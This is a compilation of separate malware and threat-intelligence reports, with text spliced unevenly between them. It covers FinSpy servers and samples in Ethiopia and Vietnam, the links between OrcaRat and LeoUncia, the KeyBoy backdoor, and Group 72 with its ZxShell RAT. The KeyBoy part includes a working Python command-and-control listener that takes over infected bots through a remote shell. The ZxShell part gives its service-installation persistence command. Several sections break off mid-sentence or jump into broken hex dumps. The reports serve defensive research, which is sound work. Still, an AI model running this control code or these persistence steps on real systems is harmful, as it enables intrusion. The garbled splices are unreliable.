<figure><caption>Figure 1.Map of global FinFisher proliferation</caption></figure> 

Around October 2012, we observed that the behavior of FinSpy servers began to change.Servers stopped responding to our fingerprint, which had exploited a quirk in the distinctive FinSpy wire protocol.We believe that this indicates that Gamma either independently changed the FinSpy protocol, or was able to determine key elements of our fingerprint, although it has never been publicly revealed.In the wake of this apparent update to FinSpy command & control servers, we devised a new fingerprint and conducted a scan of the internet for FinSpy command & control servers.This scan took roughly two months and involved sending more than 12 billion packets.Our new scan identified a total of 36 FinSpy servers, 30 of which were new and 6 of which we had found during previous scanning.The servers operated in 19 different countries.Among the FinSpy servers we found, 7 were in countries we hadn’t seen before.New Countries: Canada, Bangladesh, India, Malaysia, Mexico, Serbia, Vietnam

In our most recent scan, 16 servers that we had previously found did not show up.We suspect that after our earlier scans were published the operators moved them.Many of these servers were shut down or relocated after the publication of previous results, but before the apparent October 2012 update.We no longer found FinSpy servers in 4 countries where previous scanning identified them (Brunei, UAE, Latvia, and Mongolia).Taken together, FinSpy servers are currently, or have been present, in 25 countries: Australia, Bahrain, Bangladesh, Brunei, Canada, Czech Republic, Estonia, Ethiopia, Germany, India, Indonesia, Japan, Latvia, Malaysia, Mexico, Mongolia, Netherlands, Qatar, Serbia, Singapore, Turkmenistan, United Arab Emirates, United Kingdom, United States, Vietnam.</section>

<section>
Importantly, we believe that our list of servers is incomplete due to the large diversity of ports used by FinSpy servers, as well as other efforts at concealment.Moreover, discovery of a FinSpy command and control server in a given country is not a sufficient indicator to conclude the use of FinFisher by that country’s law enforcement or intelligence agencies.In some cases, servers were found running on facilities provided by commercial hosting providers that could have been purchased by actors from any country.The table below shows the FinSpy servers detected in our latest scan.We list the full IP address of servers that have been previously publicly revealed.For active servers that have not been publicly revealed, we list the first two octets only.Releasing complete IP addresses in the past has not proved useful, as the servers are quickly shut down and relocated.However, we observed only six of these servers active at any given time, suggesting that some IP addresses may have changed during our scans.-   A server identified in Germany has the registrant “Gamma International GmbH,” and the contact person is listed as “Martin Muench.”

-   There is a FinSpy server in an IP range registered to “Verizon Wireless.” Verizon Wireless sells ranges of IP addresses to corporate customers, so this is not necessarily an indication that Verizon Wireless itself is operating the server, or that Verizon Wireless customers are being spied on.-   A server in Qatar that was previously detected by Rapid7 seems to be back online after being unresponsive during the last round of our scanning.The server is located in a range of 16 addresses registered to “Qtel – Corporate accounts – Government Relations.” The same block of 16 addresses also contains the website http://qhotels.gov.qa/.</section>

<section>
<heading>3.ETHIOPIA AND VIETNAM: IN-DEPTH DISCUSSION OF NEW SAMPLES</heading>

<heading>3.1 FinSpy in Ethiopia</heading>

We analyzed a recently acquired malware sample and identified it as FinSpy.The malware uses images of members of the Ethiopian opposition group, Ginbot 7, as bait.The malware communicates with a FinSpy Command & Control server in Ethiopia, which was first identified by Rapid7 in August 2012.The server has been detected in every round of scanning, and remains operational at the time of this writing.It can be found in the following address block run by Ethio Telecom, Ethiopia’s state-owned telecommunications provider:

<list>
   IP: 213.55.99.74
   route: 213.55.99.0/24
   descr: Ethio Telecom
   origin: AS24757
   mnt-by: ETC-MNT
   member-of: rs-ethiotelecom
   source: RIPE # Filtered
</list>

The server appears to be updated in a manner consistent with other servers, including servers in Bahrain and Turkmenistan.<table>
   MD5           8ae2febe04102450fdbc26a38037c82b

   SHA-1         1fd0a268086f8d13c6a3262d41cce13470886b09

   SHA-256       ff6f0bcdb02a9a1c10da14a0844ed6ec6a68c13c04b4c122afc559d606762fa
</table>


The sample is similar to a previously analyzed sample of FinSpy malware sent to activists in Bahrain in 2012.Just like Bahraini samples, the malware relocates itself and drops a JPG image with the same filename as the sample when executed by an unsuspecting user.This appears to be an attempt to trick the victim into believing the opened file is not malicious.Here are a few key similarities between the samples:

-   The PE timestamp “2011-07-05 08:25:31” of the packer is exactly the same as the Bahraini sample.-   The following string (found in a process infected with the malware), self-identifies the malware and is similar to strings found in the Bahraini samples:

-   <figure></figure>

-   The samples share the same Bootkit, SHA-256: ba21e452ee5ff3478f21b293a134b30ebf6b7f4ec03f8c8153202a740d7978b2.-   The samples share the same driverw.sys file, SHA-256: 62bde3bac3782d36f9f2e56db097a4672e70463e11971fad5de060b191efb196.<figure><caption>Figure 2.The image shown to the victim contains pictures of members of the Ginbot 7 Ethiopian opposition group</caption></figure>

In this case the picture contains photos of members of the Ethiopian opposition group, Ginbot 7.Controversially, Ginbot 7 was designated a terrorist group by the Ethiopian Government in 2011.The Committee to Protect Journalists (CPJ) and Human Rights Watch have both criticized this action, CPJ has pointed out that it is having a chilling effect on legitimate political reporting about the group and its leadership.The existence of a FinSpy sample that contains Ethiopia-specific imagery, and that communicates with a still-active command & control server in Ethiopia strongly suggests that the Ethiopian Government is using FinSpy.<heading>3.2 FinSpy Mobile in Vietnam</heading>

We recently obtained and analyzed a malware sample<fn>6</fn> and identified it as FinSpy Mobile for Android.The sample communicates with a command & control server in Vietnam, and exfiltrates text messages to a Vietnamese telephone number.The FinFisher suite includes mobile phone versions of FinSpy for all major platforms including iOS, Android, Windows Mobile, Symbian and Blackberry.Its features are broadly similar to the PC version of FinSpy identified in Bahrain, but it also contains mobile-specific features such as GPS tracking and functionality for silent ‘spy’ calls to snoop on conversations near the phone.An in-depth analysis of the FinSpy Mobile suite of backdoors was provided in an earlier blog post: The Smartphone Who Loved Me: FinFisher Goes Mobile?<table>
MD5         573ef0b7ff1dab2c3f785ee46c51a54f

SHA-1       d58d4f6ad3235610bafba677b762f3872b0f67cb

SHA-256     363172a2f2b228c7b00b614178e4ffa00a3a124200ceef4e6d7edb25a4696345
</table>


The sample included a configuration file<fn>7</fn> that indicates available functionality, and the options that have been enabled by those deploying it:

<figure><caption>Figure 3.Both the command & control server IP and the phone number used for text-message exfiltration are in Vietnam which indicates a domestic campaign.This apparent FinSpy deployment in Vietnam is troubling in the context of recent threats against online free expression and activism.In 2012, Vietnam introduced new censorship laws amidst an ongoing harassment, intimidation, and detention campaign against of bloggers who spoke out against the regime.This culminated in the trial of 17 bloggers, 14 of whom were recently convicted and sentenced to terms ranging from 3 to 13 years.<fn>8</fn>

</section>

<section>
<heading>4.BRIEF DISCUSSION OF FINDINGS</heading>

Companies selling surveillance and intrusion software commonly claim that their tools are only used to track criminals and terrorists.FinFisher, VUPEN and Hacking Team have all used similar language.<fn>9</fn> Yet a growing body of evidence suggests that these tools are regularly obtained by countries where dissenting political activity and speech is criminalized.Our findings highlight the increasing dissonance between Gamma’s public claims that FinSpy is used exclusively to track “bad guys” and the growing body of evidence suggesting that the tool has and continues to be used against opposition groups and human rights activists.While our work highlights the human rights ramifications of the mis-use of this technology, it is clear that there are broader concerns.A global and unregulated market for offensive digital tools potentially presents a novel risk to both national and corporate cyber-security.On March 12th, US Director of National Intelligence James Clapper stated in his yearly congressional report on security threats:

“…companies develop and sell professional-quality technologies to support cyberoperations–often branding these tools as lawful-intercept or defensive security research products.Foreign governments already use some of these tools to target U.S. systems.”

The unchecked global proliferation of products like FinFisher makes a strong case for policy debate about surveillance software and the commercialization of offensive cyber-capabilities.Our latest findings give an updated look at the global proliferation of FinSpy.We identified 36 active FinSpy command & control servers, including 30 previously-unknown servers.Our list of servers is likely incomplete, as some FinSpy servers employ countermeasures to prevent detection.Including servers discovered last year, we now count FinSpy servers in 25 countries, including countries with troubling human rights records.This is indicative of a global trend towards the acquisition of offensive cyber-capabilities by non-democratic regimes from commercial Western companies.The Vietnamese and Ethiopian FinSpy samples we identified warrant further investigation, especially given the poor human rights records of these countries.The fact that the Ethiopian version of FinSpy uses images of opposition members as bait suggests it may be used for politically influenced surveillance activities, rather than strictly law enforcement purposes.The Ethiopian sample is the second FinSpy sample we have discovered that communicates with a server we identified by scanning as a FinSpy command & control server.This further validates our scanning results, and calls into question Gamma’s claim that such servers are “not … from the FinFisher product line.”<fn>10</fn> Similarities between the Ethiopian sample and those used to target Bahraini activists also bring into question Gamma International’s earlier claims that the Bahrain samples were stolen demonstration copies.While the sale of such intrusion and surveillance software is largely unregulated, the issue has drawn increased high-level scrutiny.We also hope that our findings will provide valuable information to the ongoing technology and policy debate about surveillance software and the commercialisation of offensive cyber-capabilities.</section>

<noncontent>
<heading>ACKNOWLEDGEMENTS</heading>

We’d like to thank Eva Galperin and the Electronic Frontier Foundation (EFF), Privacy International, Bahrain Watch, and Drew Hintz.<heading>MEDIA COVERAGE</heading>
Media coverage of the report includes HuffingtonPost Canada, Salon, The Verge, Bloomberg Business Week,
TheYoungTurks.__________________________________

<footnote>
<heading>FOOTNOTES</heading>
1
  https://www.gammagroup.com/
2
  Software Meant to Fight Crime Is Used to Spy on Dissidents, http://goo.gl/GDRMe, New York Times,
August 31, 2012, Page A1 Print edition.<doc>
<header>LeoUncia and OrcaRat</header>
<section>
The PWC-named malware OrcaRat is presented as a new piece of malware but looking at the URI used for C&C communication, it could be an updated version of a well-
known and kind of old piece of malware: LeoUncia.Could it be the same kind of things, huh?Let's dig a little deeper inside the code to check if it is just some sort of coincidence or if it is indeed the same code
that is behind these two pieces of malware.PWC explain it pretty well: the URI is made of some sort of Base64-encoded strings with the middle one being the seed to be associated to the master key to decrypt the
whole thing.Actually:

                                                                           <code>URI = E1/E2/E3/E4/E5</code>

and to obtain Di (the original data that gives us Ei once encrypted), we must perform the following operation:

                                                 <code>Di = rc4(md5(custom_debase64(E3)+master_key)).decrypt(Ei)</code>

where master_key is “OrcaKiller” for the OrcaRat sample.What can we find in LeoUncia that is to be found in OrcaRat too?</section>
<section>
<heading>URI decryption</heading>




First, let's have a look at the URI decryption routine.Dealing with OrcaRat, we have seen the following algorithm:

                                                 <code>Di = rc4(md5(custom_debase64(E3)+master_key)).decrypt(Ei)</code>

When we talk about LeoUncia, we can have a look at the blog posts made by FireEye back in December 2010, especially the second one, where some assembly code has
been screenshot from IDA without ever giving the name of the underlying algorithm: yes, it is RC4!Once decoded from Base64, the binary data we obtain from the URI is comprised of two parts: the first 16 bytes are the decryption key, and the rest of the data is the
information to be decrypted.Putting back pieces together, we have the following algorithm for LeoUncia:

                                           <code>D = rc4(custom_debase64(E)[:16]).decrypt(custom_debase64(E)[16:])</code>

The two samples both share a "custom" Base64 encoding with the use of RC4; nothing fabulous, but it is a start.</section>
<section>
<heading>Encoding</heading>




We dig further with the encoding algorithm: the so-called “custom” Base64.In both case, the first goal of the customization is to avoid the presence of some “/” in any encoded data, because it would break down the process of cutting the URI along
with the “/” separator.For LeoUncia, the Base64 being used is the Base64-URI that replaces “+” and “/” by “.” and “_”, while for OrcaRat, “+” are kept and “/” are
replaced by “~”.Additionally, OrcaRat authors thought it would be great if the URI was a little less obviously Base64-related.So, rather than splitting every eight characters to avoid having
"=" in the URI, they decided that replacing the endings "=" in "=1" and "==" in "=2" would be a great improvement.</section>

<section>
<heading>Hibernation feature</heading>




Let's have a look at one of the feature of LeoUncia: the hibernate feature.The feature does the same in OrcaRat: check for some date and time written in a file, and sleep for as long as needed before deleting the aforementioned file.(We would
also notice that an useless call to FileTimeToSystemTime has been removed meanwhile.)The real difference lies in the obfuscation of the filename: LeoUncia was using a plain-text filename (“readx”), whereas OrcaRat is obfuscating (just the same way it
obfuscates the Campaign ID) this data: the filename is “wbt.dat” (obfuscated string XORed character-by-character with the XOR key “product”) and it is located in the “App
Data” folder of the user OrcaRat is running with.The LeoUncia sample studied by FireEye includes a perfect English string:

      “\r\nThe Remote Shell Execute: %s completed!\r\n”

Unfortunately, we cannot find this string in the OrcaRat sample.Bad luck...But when we look at a more recent sample of LeoUncia, we have one with the above string and two other interesting strings:

      “\r\nThe Remote Shell Execute: %s completed!\r\n”
      “\r\nReturnTime Set Error!\r\n”
      “\r\nReturnTime set success!\r\n”

These two strings are linked to the writing in the hibernation file, and indicates to the C&C manager that its command either succeeded or failed.That is very interesting because the OrcaRat sample is also using some very similar debug strings to notify its C&C about the hibernate command:

      “\r\nSet return time error = %d!\r\n”
      “\r\nSet return time success!\r\n”

And yes, it is always easier to debug your code when you know the error code; that's an improvement!</section>
<section>
<heading>Conclusion</heading>




These two families are most likely linked in the sense that OrcaRat is a nicely updated version of LeoUncia.</section>

</doc><doc>
<section>
<heading>KeyBoy, Targeted Attacks against Vietnam and India</heading>
In our never-ending quest to spot and expose the nastiest of the Internet, me and Mark this time
incidentally stepped into a targeted attacks campaign apparently directed at a distributed and
diversified base of victims.In this blog post we'll analyze two specific incidents apparently targeting
victims in Vietnam and in India and we'll describe the capabilities of the custom backdoor being used
that for convenience (and to our knowledge, for a lack of an existing name) we call KeyBoy, due to a
string present in one of the samples.We'll describe how the attackers operate these backdoors, provide some scripts useful to further
investigate the campaign as well as meanings to detect infections or scout for additional samples.</section>

<section>
<heading>Exploits and Payloads</heading>

We encountered the first document exploit called "THAM luan- GD- NCKH2.doc" a few days ago, which
appears to be leveraging some vulnerabilities patched with MS12-060.When opened with a vulnerable
version of Microsoft Word, the exploit will initiate the infection routine and display the legitimate
document that follows:

<figure></figure>

This document, written in Vietnamese, appears to be reviewing and discussing best practices for teaching
and researching scientific topics.We have no knowledge on the identity of the target, but we can assume
he might part of the Vietnamese academic community.The document is named to Nguyen Anh Tuan,
which is presented as author of this crafted text.The content of the document is the following:


<figure></figure>
This time the bait appears to be related to the state of telecommunication infrastructure in the district of
Calcutta in India, discussing the coverage of GSM networks and availability and stability of broadband
connections.Also for this intrusion we can't know the identity of the target, but our hypothesis is either someone in the
telecommunications industry or a representative of the local government.In this case this crafted
document pretends to be authored by someone called Amir Kumar Gupta.</section>

<section>
<heading>Analysis of the Backdoor</heading>

For the sake of this analysis we'll take the Vietnamese backdoor as an example; the one found in the
Indian attack operates in the exact same way.As mentioned, when the exploit is opened a dropper is created and launched, which then takes care of
creating a Windows service called MdAdum, which is then visible in the registry as follows:

<figure></figure>

The dropper then launches the service with the DLL located at
C:\WINDOWS\system32\CREDRIVER.dll and deletes itself.Resilience on the system is guaranteed
by the use of such service which will be executed at every start up.Note that the Indian attack does not make use of this middle-stage dropper, but directly installs and
launches the Windows service instead.This backdoor has several features including:

   1.Steal credentials from Internet Explorer
   2.Steal credentials from Mozilla Firefox
   3.Install a keylogger for intercepting credentials on Google Chrome
   4.Operate in an interactive mode to allow the attacker to perform additional investigation on the
      compromised system and exfiltrate data.Following you can see the portion of the code where the backdoor, after having verified which version of
Mozilla Firefox is installed on the system, decides which technique to use to recover the credentials from
the browser's local storage.<figure></figure>
In older versions of Firefox, credentials were stored in several .txt files in %AppData%\Mozilla\Firefox,
while in most recent ones they are stored in a SQLite database.In the following snipped you see the SQL
statement to extract the data:

<figure></figure>


Just in the same way, the backdoor attempts to collect password autocomplete from Internet Explorer:

<figure></figure>

The backdoor also creates a separate thread that installs a Windows hook procedure on message
WH_KEYBOARD_LL, through which it can intercept keystrokes.In
the second set they are making use of a dynamic DNS service by ChangeIP.com.?....,....a..|

00000010 19 26 f8 de bd 26 de 19 b0 19 1a 95 a1 dd 2b 6d |.&...&........+m|

00000020 c2 1a 82 b0 19 eb 47 b0 26 47 b0 26 20 82 eb ca |......G.&G.& ...|

00000030 bd 26 ca 82 54 1a d0 c2 87 38 a1 20 82 b0 19 eb |.&..T....8.....|

00000040 b0 54 b0 19 1a 00                         |.T....|

At the time of the analysis all the C&C servers were not responding, we started reverse engineering the
communication protocol and noticed that it simply used a multiply with 0x69 to encode the traffic sent to
the controllers.The following is a preliminary Python script that implements the protocol used by the
malware and allows you to interact with it:

   1.2.3.4.5.6.7.8.9. import sys
 10. import socket
  11. import select
  12.13.14. def decode(x):
15.   return ''.join([chr((ord(i)*0xd9)&0xff) for i in x])
16.17.18. def encode(x):
19.   return ''.join([chr((ord(i)*0x93)&0xff) for i in x])
20.21.22. def main():
23.   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
24.   s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
25.   s.bind(("0.0.0.0", 443))
26.   s.listen(1)
27.28.29.   print "[*] C&C Running on 0.0.0.0:443"
30.31.32.   while True:
33.     s2, ca = s.accept()
34.     print "[+] New client connected:", ca
35.36.     while True:
37.       dec = ""
38.       rlist, wlist, xlist = select.select([s2,],[],[], 10)
39.       while rlist:
40.          data = s2.recv(2048)
41.          if not data: break
42.43.44.          dec = decode(data)
45.          print dec
46.          rlist, wlist, xlist = select.select([s2,],[],[], 2)
47.48.49.          if dec.startswith("$login$"):
 50.             print "[+] Authenticating on the bot"
  51.            s2.send(encode("login_OK")+ "\x00")
  52.            s2.send(encode("Refresh")+ "\x00")
  53.         elif dec.startswith("OnLine"):
  54.            s2.send(encode("test")+ "\x00")
  55.         else:
  56.            cmd = raw_input("shell> ").strip()
  57.            s2.send(encode(cmd)+"\x00")
 58.59.60.        s2.close()
  61.62.63.     s.close()
 64.      return 0
  65.66.67. if __name__ == "__main__":
 68.      try: sys.exit(main())
 69.      except KeyboardInterrupt: pass

We then launched this script and redirected the traffic coming from a system infected with KeyBoy and
took control of it .Here you can see the bot beaconing in and requiring for authentication (funny enough the password is
"test", while the Indian sample uses "dns.com"):

[*] C&C Running on 0.0.0.0:443

[+] New client connected: ('192.168.56.110', 1443)

$login$

LAB

192.168.56.110

MyUser

2013/06/07 02:18:35

Proxy 20130401

[+] Authenticating on the bot

OnLine

Pw_OK

When the authentication is confirmed, we are prompted with a shell through which we can interact in
real-time with the bot.The messages we previously identified represent the actual commands that can be
sent to the bot:

      Sysinfo: returns detailed information on the computer (pretty much the output of systeminfo); the
      bot will respond with a message with the header $sysinfo$.FileManager: interact with all the disks available on the victim system; the bot will respond with a
      message with the header $fileManager$.Download: download a file from the compromised system; the bot will respond with a message
      with the header $fileDownload$.UploadFileOk: upload a file to the compromised system; the bot will respond with a message with
      the header $fileUpload$.</section>

<section>
<heading>Detecting Infections</heading>

While these are clearly not widespread attacks and, as in any other targeted attack case, we should not
create alarmism for threats that are likely irrelevant for the majority of organizations, we want to share a
few indicators that might help identify infections or assist in further research by whoever is interested in
this campaign.We also created a couple of Yara rules that you can use to scan your systems your collection of malware
samples to identify copies of KeyBoy:
</section>

<section>
<heading>Conclusions</heading>

Not a day passes by without hearing of someone hit by a targeted attack.Recently the growth of amount

and scale of targeted attacks has come to the point were they are starting to look more like
opportunistic carpet bombings rather than ninja strikes.It's common to observe attacks pulled
off successfully without any particular sophistication in place, including the incidents described in this
post.It's also getting quite difficult to attribute the attacks to any state-sponsored unit, both because there's a
generic lack of strong evidence in such incidents (which is why we refrained from making any statement
on the origin of these intrusions) but frankly also because almost anybody could operate such
campaigns and be reasonably successful.The only differentiation between actors at this point exclusively
relies on identifying the motivations and the context.Beware though, just because these attacks are conceptually targeted, it doesn't necessarily mean that they
should have a higher priority than any other threat on your security program.Our suggestion remains the
same: identify your core assets, recognize the most impactful threats to such assets and inform and protect
yourself accordingly.This research was brought to you by Claudio Guarnieri and Mark Schloesser from Rapid7 Labs.</section>

</doc><doc>
<header>Threat Spotlight: Group 72</header>
<section>This post is co-authored by Joel Esler, Martin Lee and Craig Williams

Everyone has certain characteristics that can be recognised.This may be a way of walking, an accent, a
turn of phrase or a style of dressing.If you know what to look for you can easily spot a friend or
acquaintance in a crowd by knowing what characteristics to look for.Exactly the same is true for threat
actors.Each threat actor group may have certain characteristics that they display during their attack campaigns.These may be the types of malware that they use, a pattern in the naming conventions of their command
and control servers, their choice of victims etc.Collecting attack data allows an observer to spot the
characteristics that define each group and identify specific threat actors from the crowd of malicious
activity on the internet.Talos security and intelligence research group collects attack data from our various telemetry systems to
analyse, identify and monitor threat actors through their different tactics, techniques, and procedures.Rather than give names to the different identified groups, we assign numbers to the threat actors.We
frequently blog about significant attack campaigns that we discover, behind the scenes we integrate our
intelligence data directly into our products.As part of our research we keep track of certain threat actor
groups and their activities.In conjunction with a number of other security companies, we are taking
action to highlight and disrupt the activities of the threat actors identified by us as Group 72.Group 72 is a long standing threat actor group involved in Operation SMN, named Axiom by Novetta.The
group is sophisticated, well funded, and possesses an established, defined software development
methodology.The group targets high profile organizations with high value intellectual property in the
manufacturing, industrial, aerospace, defense, media sectors.Geographically, the group almost exclusively
targets organizations based in United States, Japan, Taiwan, and Korea.The preferred tactics of the group
include watering-hole attacks, spear-phishing, and other web-based tactics.The tools and infrastructure used by the attackers are common to a number of other threat actor groups
which may indicate some degree of overlap.We have seen similar patterns used in domain registration for
malicious domains, and the same tactics used in other threat actor groups leading us to believe that this
group may be part of a larger organization that comprises many separate teams, or that different groups
share tactics, code and personnel from time to time.It is possible that Group 72 has a vulnerability research team searching for 0-day vulnerabilities in
Windows.The group is associated with the initial attack campaigns utilising exploits for the following
vulnerabilities CVE-2014-0322 and CVE-2012-4792 .We have also observed them using SQL injection as
part of their attacks, and exploits based on CVE-2012-1889 and CVE-2013-3893.Frequently the group deploys a remote access trojan (RAT) on compromised machines.These are used
both to steal data and credentials from compromised machines, and to use the machine as a staging post
to conduct attacks against further systems on the network, allowing the attackers to spread their
compromise within the organization.Unlike some threat actors, Group 72 does not prefer to use a single
RAT as part of their attacks.We have observed the group to use the following RAT malware:

      Gh0st RAT (aka Moudoor)
      Poison Ivy (aka Darkmoon)
      HydraQ (aka 9002 RAT aka McRAT aka Naid)
      Hikit (aka Matrix RAT aka Gaolmay)
      Zxshell (aka Sensode)
      DeputyDog (aka Fexel) — Using the kumanichi and moon campaign codes
      Derusbi
      PlugX (aka Destroy RAT aka Thoper aka Sogu)
      HydraQ and Hikit, according to our data are unique to Group 72 and to two other threat actor
      groups.While their operational security is very good, patterns in their domains can be identified such as
seemingly naming domains after their intended victim.We have observed domains such as
companyname.attackerdomain.com and companyacronym.attackerdomain.com.We have also observed
similar patterns in the disposable email addresses used to register their domains.These slips, among
others, allow us to follow their activities.Intriguingly we have observed the same email address being used
in the activities of this and two other threat actor groups.This may suggest that these three groups are
indeed one unit, or possibly hint at shared staff or ancillary facilities.We will post a follow up with more technical detail in the coming days.CWS or WSA web scanning prevents access to malicious
<figure></figure>                                         websites, including watering hole attacks, and detects malware
                                         used in these attacks.The Network Security protection of IPS and NGFW have up-to-
                                         date signatures to detect malicious network activity by threat
                                         actors.ESA can block spear phishing emails sent by threat actors as part of their campaign.Tags: APT, malware, Operation SMN, security, SMN, Talos, threats</section>


</doc><doc>
<header>Threat Spotlight: Group 72, Opening the ZxShell</header>
<section>
This post was authored by Andrea Allievi, Douglas Goddard, Shaun Hurley, and Alain Zidouemba.Recently, there was a blog post on the takedown of a botnet used by threat actor group known as Group 72 and their
involvement in Operation SMN.This group is sophisticated, well funded, and exclusively targets high profile organizations
with high value intellectual property in the manufacturing, industrial, aerospace, defense, and media sector.The primary
attack vectors are watering-hole, spear phishing, and other web-based attacks.Frequently, a remote administration tool (RAT) is used to maintain persistence within a victim’s organization.These tools
are used to further compromise the organization by attacking other hosts inside the targets network.ZxShell (aka Sensocode) is a Remote Administration Tool (RAT) used by Group 72 to conduct cyber-espionage operations.Once the RAT is installed on the host it will be used to administer the client, exfiltrate data, or leverage the client as a pivot to
attack an organization’s internal infrastructure.Here is a short list of the types of tools included with ZxShell:

      Keylogger (used to capture passwords and other interesting data)
      Command line shell for remote administration
      Remote desktop
      Various network attack tools used to fingerprint and compromise other hosts on the network
      Local user account creation tools

For a complete list of tools please see the MainConnectionIo section.The following paper is a technical analysis on the functionality of ZxShell.The analysts involved were able to identify
command and control (C2) servers, dropper and installation methods, means of persistence, and identify the attack tools that
are core to the RAT’s purpose.In addition, the researchers used their analysis to provide detection coverage for Snort,
Fireamp, and ClamAV.</section>
<toc>
Table of Contents

   1.Background
   2.Distribution and Delivery
   3.Analysis of the main ZxShell module
            DllMain
            Install
            ServiceMain
            ShellMain
            ShellMainThread
            GetIpListAndConnect
            MainConnectionIo
            Uninstall
            ZxFunction001
            ZxFunction002
   4.Command and Control server
   5.Malware Package
   6.Version Information
   7.Extracted URL Analysis
   8.Conclusion
   9.Protecting Users From These Threats
  10.Appendix A: Snort rules
  11.Appendix B: ClamAV signatures
  12.Appendix C: List of Memory Offsets for Some ZxShell Functions
  13.Appendix D: Other Collateral
</toc>
<section>
<heading>Background</heading>

ZxShell has been around since 2004.There are a lot of versions available in the underground market.We have analyzed the
most common version of ZxShell, version 3.10.There are newer versions, up to version 3.39 as of October 2014.</section>
<section>
<heading>Distribution and Delivery</heading>

An individual who goes by the name LZX in some online forums is believed to be the original author of ZxShell.Since ZxShell
has been around since at least 2004, numerous people have purchased or obtained the tools necessary to set up ZxShell
command and control servers (C&C) and generate the malware that is placed on the victim’s network.It allocates a buffer of 0x2800 bytes and copies the code for the
ZxGetLibAndProcAddr function.To copy memory, the memcpy function is invoked.It is not directly used from msvcrt.dll but
is instead copied to another memory chunk before being called.Finally, the trojan Import Address Table (IAT) is resolved
and the file path of the process that hosts the dll is resolved and saved in a global variable.</section>
<section>
<heading>Install</heading>

ZxShell.dll is injected in a shared SVCHOST process.The Svchost group registry key
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost is opened and the netsvc group value data is queried
to generate a name for the service.Before the malware can be installed a unique name must to be generated for the service.The malware accomplishes this
through querying the netsvc group value data located in the svchost group registry key which is
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost.At startup, Svchost.exe checks the services part of the registry and constructs a list of services to load.Each Svchost session
can contain multiple shared services that are organized in groups.Therefore, separate services can run, depending on how
and where Svchost.exe is started.<figure></figure>


<caption>Image 1.Svchost Groups registry key</caption>

Svchost.exe groups are identified in the above registry key.Each value under this key represents a separate Svchost group
and appears as a separate instance when you are viewing active processes.Each value is a REG_MULTI_SZ value and
contains the services that run under that Svchost group.Each Svchost group can contain one or more service names that are
extracted from the following registry key, whose Parameters key contains a ServiceDLL value:

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Service

On a Windows machine, the netsvc group contains names of both existing and non-existing services.ZxShell exploits this fact
by cycling between each of the names, verifying the existence of the real service.The service’s existence is verified with the
ServiceExists function, which attempts to open the relative registry sub-key in HKLM\SYSTEM\CurrentControlSet\Services.The first service name that is not installed on the system becomes the ZxShell service name.A new service is then created using the service parser function ProcessScCommand.ZxShell implemented its own version of
the Windows SC command.There are minor differences between the ZxShell implementation of this command and the
original Windows one, but they are irrelevant for the purpose of the analysis The command used to install the service is:

sc create <service name> <service name> “%SystemRoot%\System32\svchost.exe -k netsvcs”

where <service name> is the chosen infected service name.<figure></figure>

<caption>Image 2.“SC” command used to create the target service,and parsed by “ProcessScCommand” routine</caption>

The installed service registry key is opened and the 2 values under its Parameter subkey are created.These 2 values,
ServiceDll and ServiceDllUnloadOnStop are needed for services that run in a shared process.Before the service is started ChangeServiceConfig is called to modify the service type to shared and interactive.If the service
fails to start then a random service name formatted as netsvc_xxxxxxxx, where xxxxxxxx represent an 8-digit random hex
value, is added to the netsvc group and the entire function is repeated.</section>
<section>
<heading>ServiceMain</heading>

This function is the entry point of the service.It registers the service using the RegisterServiceCtrlHandler Windows API
function.The ZxShell service handler routine is only a stub: it responds to each service request code, doing nothing, and
finally exits.It sets the service status to RUNNING and finally calls the ShellMain function of ZxShell.</section>
<section>
<heading>ShellMain</heading>

The ShellMain function is a stub that relocates the DLL to another buffer and spawns a thread that starts from
ShellMainThreadInt at offset +0xC0CD.The ShellMainThreadInt function gets the HeapDestroy Windows API address and
replaces the first 3 bytes with the RET 4 opcode.Subsequently, it calls the FreeLibrary function to free its own DLL buffer
located at its original address.Because of this, the allocated heaps will not be freed.It re-copies the DLL from the new buffer
to the original one using the memcpy function.Finally, it spawns the main thread that starts at the original location of
ShellMainThread procedure, and terminates.At this point, the ZxShell library is no longer linked in the module list of the
host process.This is important because if any system tool tries to open the host process it will never display the ZxShell DLL.</section>
<section>
<heading>ShellMainThread</heading>

This thread implements the main code, responsible for the entire botnet DLL.First, it checks if the DLL is executed as a
service.If so, it spawns the service watchdog thread.The watchdog thread checks the registry path of the ZxShell service
every 2 seconds, to verify that it hasn’t been modified.If a user or an application modifies the ZxShell service registry key, the
code restores the original infected service key and values.<figure></figure>

<caption>Image 3.The watchdog thread of ZxShell service</caption>

The buffer containing the ZxShell Dll in the new location is freed using the VirtualFree API function.A handle to the DLL file
is taken in order to make its deletion more difficult.The ZxShell mutex is created named @_ZXSHELL_@.ZxShell plugins are parsed and loaded with the AnalyseAndLoadPlugins function.The plugin registry key
HKLM\SYSTEM\CurrentControlSet\Control\zxplug is opened and each value is queried.The registry value contains the
plugin file name.The target file is loaded using the LoadLibrary API function, and the address of the exported function
zxMain is obtained with GetProcAddress.If the target filename is incorrect or invalid the plugin file is deleted and the registry value is erased.That is performed by the
function DeleteAndLogPlugin.Otherwise, the plugin is added to an internal list.We will take a
look at the keylogger later on.Finally the main network communication function GetIpListAndConnect is called.</section>
<section>
<heading>GetIpListAndConnect</heading>

This function is at the core of the RAT’s network communication.It starts by initializing a random number generator and
reading 100 bytes inside the ZxShell Dll at a hardcoded location.These bytes are XOR encrypted with the byte-key 0x85 and
contains a list of remote hosts where to connect.The data is decrypted, the remote host list is parsed and verified using the
BuildTargetIpListStruct function.There are 3 types of lists recognized by ZxShell: plain ip addresses, HTTP and FTP
addresses.If the list does not contain any item, or if the verification has failed, the ZxShell sample tries to connect to a hardcoded host
with the goal of retrieving a new updated list.Otherwise, ZxShell tries to connect to the first item of the list.If ZxShell successfully connects to the remote host, the
function DoHandshake is called.This function implements the initial handshake which consists of exchanging 16 bytes,
0x00001985 and 0x00000425, with the server.The function GetLocalPcDescrStr is used to compose a large string that
contains system information of the target workstation.That information is the following:

      local hostname
      organization
      owner
      operating system details
      CPU speed
      total physical memory

The string is sent to the remote host and the response is checked to see if the first byte of the response is 0xF4, an arbitrary
byte.If it is, the botnet connection I/O procedure is called through the MainConnectionIo function.<figure></figure>

Image 4.The GetLocalPcDescrStr and DoHandshake functions called beforestarting the command processing

